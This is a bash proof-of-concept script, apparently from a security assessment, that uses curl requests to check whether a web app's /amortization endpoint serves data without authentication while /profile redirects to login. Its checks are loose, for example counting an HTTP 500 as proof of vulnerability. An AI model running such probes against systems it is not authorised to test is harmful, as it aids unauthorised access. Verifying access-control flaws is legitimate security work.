#!/bin/bash

# POC: Missing Authentication on Amortization Endpoint
# This script demonstrates that the /amortization endpoint is accessible without authentication
# while other endpoints like /profile require authentication

TARGET_URL="${1:-http://localhost:5000}"

echo "=== POC: Missing Authentication on /amortization Endpoint ==="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Access /amortization without session (should fail with proper auth, but succeeds here)
echo "[Test 1] Accessing /amortization without session cookie"
echo "Command: curl -v '$TARGET_URL/amortization?term=5'"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/amortization?term=5" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "Amortization"; then
    echo "✓ VULNERABLE: Endpoint returned amortization data without authentication"
    echo "Response contains amortization table"
elif [ "$HTTP_CODE" = "500" ]; then
    echo "✓ VULNERABLE: Endpoint attempted to process request (HTTP 500 error)"
    echo "Shows endpoint is not rejecting unauthenticated requests at auth layer"
elif [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Endpoint returned HTTP 200 without authentication"
    echo "Response preview:"
    echo "$BODY" | head -20
else
    echo "Response Status: $HTTP_CODE"
fi
echo ""

# Test 2: Access /profile without session (should redirect to login)
echo "[Test 2] Accessing /profile without session (for comparison)"
echo "Command: curl -s -L '$TARGET_URL/profile' | head -20"
echo ""
PROFILE_RESPONSE=$(curl -s -L "$TARGET_URL/profile" 2>&1)
if echo "$PROFILE_RESPONSE" | grep -q "login\|Login\|password"; then
    echo "✓ PROTECTED: /profile requires authentication (redirects to login page)"
    echo "Response contains login form"
else
    echo "Response preview:"
    echo "$PROFILE_RESPONSE" | head -20
fi
echo ""

# Test 3: Compare HTTP status codes
echo "[Test 3] Comparing HTTP status codes"
echo ""
AMORT_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/amortization?term=5")
PROFILE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/profile")

echo "Endpoint               | HTTP Status"
echo "---------------------- | -----------"
echo "/amortization (no auth) | $AMORT_CODE"
echo "/profile (no auth)      | $PROFILE_CODE"
echo ""

if [ "$AMORT_CODE" = "200" ] || [ "$AMORT_CODE" = "500" ]; then
    if [ "$PROFILE_CODE" = "302" ] || [ "$PROFILE_CODE" = "301" ]; then
        echo "✓ VULNERABILITY CONFIRMED:"
        echo "  - /amortization accepts requests without auth (HTTP $AMORT_CODE)"
        echo "  - /profile redirects unauthenticated requests (HTTP $PROFILE_CODE)"
        echo "  - /amortization is missing authentication checks"
        exit 0
    fi
fi

# Test 4: Try accessing with malformed term parameter
echo "[Test 4] Testing with term parameter value"
echo ""
TERM_RESPONSE=$(curl -s "$TARGET_URL/amortization?term=10" 2>&1)
if echo "$TERM_RESPONSE" | grep -q "payment\|Payment\|Amortization\|amortization"; then
    echo "✓ VULNERABLE: Endpoint generates amortization output for unauthenticated request"
    echo "Output preview (first 200 chars):"
    echo "$TERM_RESPONSE" | head -c 200
    echo ""
    exit 0
elif [ "$HTTP_CODE" = "500" ]; then
    echo "✓ VULNERABLE: Endpoint processes request (error shows processing occurred)"
    exit 0
fi

echo ""
echo "Analysis complete."